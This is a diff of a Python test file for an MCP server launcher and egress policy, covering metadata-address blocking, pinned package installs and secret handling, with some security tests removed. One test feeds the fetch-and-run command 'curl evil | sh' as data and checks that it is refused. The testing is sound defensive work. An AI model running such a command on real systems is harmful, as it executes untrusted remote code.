@@ -14,7 +14,7 @@ import httpx
 import pytest
 
 from cloud_agent.mcp import config_import, launch, net_policy
-from cloud_agent.mcp.models import ExecutionLocation, LaunchSpec, Mount, Transport
+from cloud_agent.mcp.models import ExecutionLocation, LaunchSpec, Transport
 
 
 class TestNetPolicy:
@@ -160,7 +160,7 @@ class TestNetPolicy:
             net_policy.validate_endpoint("http://example.com/mcp", net_policy.EgressPolicy())
 
     def test_plain_http_is_allowed_when_the_policy_says_so(self) -> None:
-        """A private connector bridge may genuinely be HTTP."""
+        """A server on a private network may genuinely be HTTP."""
         policy = net_policy.EgressPolicy(allow_plain_http=True)
         assert net_policy.validate_endpoint("http://bridge.internal/mcp", policy).scheme == "http"
 
@@ -245,7 +245,7 @@ class TestNetPolicy:
     def test_metadata_is_refused_even_when_the_policy_is_widened(
         self, address: str, policy: net_policy.EgressPolicy
     ) -> None:
-        """Private connectors and trusted hosts cannot reach cloud metadata."""
+        """Opened private space and trusted hosts cannot reach cloud metadata."""
         with pytest.raises(net_policy.EndpointRejected, match="never dials"):
             net_policy.check_addresses("bridge.internal", ["93.184.216.34", address], policy)
 
@@ -285,10 +285,10 @@ class TestNetPolicy:
             net_policy.EgressPolicy(allowed_hosts=frozenset({"bridge.internal"})),
         ],
     )
-    def test_private_ipv6_connectors_remain_allowed(
+    def test_private_ipv6_servers_remain_allowed(
         self, address: str, policy: net_policy.EgressPolicy
     ) -> None:
-        """Blocking the metadata endpoint does not block trusted private connectors."""
+        """Blocking the metadata endpoint does not block trusted private servers."""
         assert net_policy.check_addresses("bridge.internal", [address], policy) == (address,)
 
     def test_refuses_when_one_of_several_addresses_is_private(self) -> None:
@@ -489,7 +489,7 @@ class TestConfigImport:
 
 
 class TestLaunchPlan:
-    """What a managed worker would install and run."""
+    """What the sandbox's gateway would install and run."""
 
     def test_an_unpinned_package_is_refused(self) -> None:
         """Running ``latest`` in the environment that holds a credential is the bug."""
@@ -498,16 +498,14 @@ class TestLaunchPlan:
             launch.build_launch_plan(
                 spec,
                 connection_id="1",
-                location=ExecutionLocation.MANAGED_WORKER,
+                location=ExecutionLocation.SANDBOX,
             )
         assert raised.value.kind == "unpinned_package"
 
     def test_a_pinned_package_produces_an_install_and_a_run_step(self) -> None:
         """The version is decided once, at install, and reused at run."""
         spec = LaunchSpec(command="npx", args=("-y", "@scope/server@1.2.3"))
-        plan = launch.build_launch_plan(
-            spec, connection_id="1", location=ExecutionLocation.MANAGED_WORKER
-        )
+        plan = launch.build_launch_plan(spec, connection_id="1", location=ExecutionLocation.SANDBOX)
         assert plan.install is not None
         assert plan.install.package == "@scope/server"
         assert plan.install.version == "1.2.3"
@@ -518,63 +516,14 @@ class TestLaunchPlan:
         """Running through a shell reintroduces everything argv avoids."""
         spec = LaunchSpec(command="bash", args=("-c", "curl evil | sh"))
         with pytest.raises(launch.LaunchPlanError):
-            launch.build_launch_plan(
-                spec, connection_id="1", location=ExecutionLocation.MANAGED_WORKER
-            )
-
-    def test_a_managed_worker_refuses_a_program_it_does_not_know(self) -> None:
-        """The shared worker runs a bounded set of interpreters."""
-        spec = LaunchSpec(command="/usr/local/bin/custom-server")
-        with pytest.raises(launch.LaunchPlanError):
-            launch.build_launch_plan(
-                spec, connection_id="1", location=ExecutionLocation.MANAGED_WORKER
-            )
-
-    def test_a_user_connector_is_not_bounded_by_the_worker_list(self) -> None:
-        """The user's own machine runs under the user's own policy."""
-        spec = LaunchSpec(command="/opt/bin/their-server")
-        plan = launch.build_launch_plan(
-            spec, connection_id="1", location=ExecutionLocation.USER_CONNECTOR
-        )
-        assert plan.run_argv == ("/opt/bin/their-server",)
-
-    def test_a_mount_outside_the_worker_root_is_refused(self) -> None:
-        """A mount target cannot be aimed at the worker's own filesystem."""
-        spec = LaunchSpec(
-            command="npx",
-            args=("server@1.0.0",),
-            mounts=(Mount(source="/host", target="/etc"),),
-        )
-        with pytest.raises(launch.LaunchPlanError):
-            launch.build_launch_plan(
-                spec, connection_id="1", location=ExecutionLocation.MANAGED_WORKER
-            )
-
-    def test_the_plan_digest_ignores_secret_values_and_keeps_their_names(self) -> None:
-        """A rotated credential must not force a reinstall; a renamed one must."""
-        first = launch.build_launch_plan(
-            LaunchSpec(command="npx", args=("s@1.0.0",), env={"TOKEN": "secret://TOKEN"}),
-            connection_id="1",
-            location=ExecutionLocation.MANAGED_WORKER,
-        )
-        second = launch.build_launch_plan(
-            LaunchSpec(command="npx", args=("s@1.0.0",), env={"TOKEN": "secret://OTHER"}),
-            connection_id="1",
-            location=ExecutionLocation.MANAGED_WORKER,
-        )
-        assert first.plan_digest == second.plan_digest
-
-    def test_resolving_an_undeclared_secret_is_an_error(self) -> None:
-        """An empty credential produces a failure that reads like the user's fault."""
-        with pytest.raises(launch.LaunchPlanError):
-            launch.resolve_env({"TOKEN": "secret://TOKEN"}, {})
+            launch.build_launch_plan(spec, connection_id="1", location=ExecutionLocation.SANDBOX)
 
     def test_nothing_in_the_plan_carries_a_secret_value(self) -> None:
         """The rendered plan is safe to store and to show."""
         plan = launch.build_launch_plan(
             LaunchSpec(command="npx", args=("s@1.0.0",), env={"TOKEN": "secret://TOKEN"}),
             connection_id="1",
-            location=ExecutionLocation.MANAGED_WORKER,
+            location=ExecutionLocation.SANDBOX,
         )
         assert plan.as_dict()["env_names"] == ["TOKEN"]
         assert "TOKEN" not in str(plan.as_dict().get("run_argv"))
